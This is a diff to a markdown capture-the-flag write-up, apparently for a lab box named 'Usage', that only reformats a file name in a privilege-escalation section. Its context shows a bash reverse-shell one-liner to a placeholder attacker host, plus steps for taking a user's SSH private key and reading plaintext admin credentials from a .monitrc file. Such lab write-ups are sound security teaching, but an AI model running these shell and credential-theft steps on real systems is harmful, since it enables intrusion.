@@ -155,7 +155,7 @@ bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
 ## Privilege Escalation
 At this point we can grab the user flag under our our directory and upgrade our shell by snagging his SSH priv key to authenticate over port 22. Seeing as there were many files pertaining to Monit (a process supervision service), I figured that another user would be in charge of it instead of our current account.
 
-Inside of .monitrc are plaintext credentials for an admin, and displaying `/etc/passwd` only showed one other user on the box.
+Inside of `.monitrc` are plaintext credentials for an admin, and displaying `/etc/passwd` only showed one other user on the box.
 
 ![](../assets/img/2026-02-26-Usage/13.png)
 
